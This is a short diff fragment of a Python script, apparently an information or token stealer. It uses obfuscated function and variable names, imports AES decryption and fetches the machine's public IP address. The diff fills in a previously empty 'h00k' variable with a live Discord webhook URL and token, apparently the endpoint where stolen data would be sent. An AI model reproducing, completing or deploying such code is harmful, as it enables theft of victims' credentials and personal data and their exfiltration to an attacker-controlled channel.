@@ -15,7 +15,7 @@ from Crypto.Cipher import AES
 from json import *
 
 
-h00k = ""
+h00k = "https://discord.com/api/webhooks/1436399229034827837/scXW0HnizEcGKCabbjpQ5rimRxzPHTqHhQI77SXLkCo4uADf7fLElrzkamlnu5z0A5kk"
 
 def G371P():
     try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
